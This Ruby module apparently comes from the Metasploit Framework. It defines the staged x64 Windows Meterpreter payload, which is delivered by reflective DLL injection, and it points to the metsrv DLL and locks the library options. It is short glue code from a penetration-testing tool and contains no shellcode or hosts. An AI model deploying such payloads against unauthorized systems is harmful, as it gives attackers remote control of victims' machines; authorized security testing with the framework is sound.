##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/payload/windows/x64/reflectivedllinject'
require 'msf/base/sessions/meterpreter_x64_win'
require 'msf/base/sessions/meterpreter_options'

###
#
# Injects the x64 meterpreter server DLL via the Reflective Dll Injection payload
#
###

module Metasploit3

  include Msf::Payload::Windows::ReflectiveDllInject_x64
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Meterpreter (Reflective Injection x64)',
      'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64)',
      'Author'        => [ 'sf' ],
      'PayloadCompat' => { 'Convention' => 'sockrdi', },
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_x64_Win))

    # Don't let people set the library name option
    options.remove_option('LibraryName')
    options.remove_option('DLL')
  end

  def library_path
    MetasploitPayloads.meterpreter_path('metsrv','x64.dll')
  end

end
